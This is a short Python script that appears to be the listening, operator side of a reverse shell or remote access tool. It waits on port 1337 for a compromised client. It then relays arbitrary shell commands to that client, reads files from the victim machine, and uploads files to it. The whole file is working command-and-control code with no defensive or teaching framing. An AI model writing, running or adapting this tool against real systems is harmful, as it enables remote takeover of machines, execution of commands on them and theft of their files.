import socket
import os

host = "0.0.0.0" # Listening IP
port = 1337 # Listening port
buff_size = 4096
SEPARATOR = "|"


def SendCommand(command, sock):
    sock.send(f"{command}".encode())
    while True:
        receive = sock.recv(buff_size).decode()
        print(receive)
        if len(receive) < buff_size:
            break


def ReadFile(filename, sock):
    sock.send(f"{filename}".encode())
    while True:
        receive = sock.recv(buff_size).decode()
        print(receive)
        if len(receive) < buff_size:
            break


def SendFile(filename, filesize, sock):
    print(f"Sending file {filename} ...")
    sock.send(f"{filename}{SEPARATOR}{filesize}".encode())
    f = open(filename, "rb")
    while True:
        data = f.read(buff_size)
        if not data:
            break
        sock.send(data)
    print("File send!")
    f.close()


sock = socket.socket()

sock.bind((host, port))

# queue only one client
sock.listen(1)

print(f"Listening port: {port}")

client_sock, client_ip = sock.accept()

print(f"connected to {client_ip} is succes!")

platform = client_sock.recv(buff_size).decode()
print(f"Platform: {platform}")

while True:
    print(">> ", end="")
    cli = input()
    if cli == "":
        continue
    elif cli == "exit":
        client_sock.send("exit".encode())
        break
    elif cli.split()[0] == "read":
        client_sock.send("ReadFile".encode())
        print(client_sock.recv(buff_size).decode())
        filename = cli.split()[1]
        ReadFile(filename, client_sock)
    elif cli.split()[0] == "send":
        client_sock.send("SendFile".encode())
        print(client_sock.recv(buff_size).decode())
        filename = cli.split()[1]
        filesize = os.path.getsize(filename)
        SendFile(filename, filesize, client_sock)
    else:
        SendCommand(cli, client_sock)

sock.close()
client_sock.close()
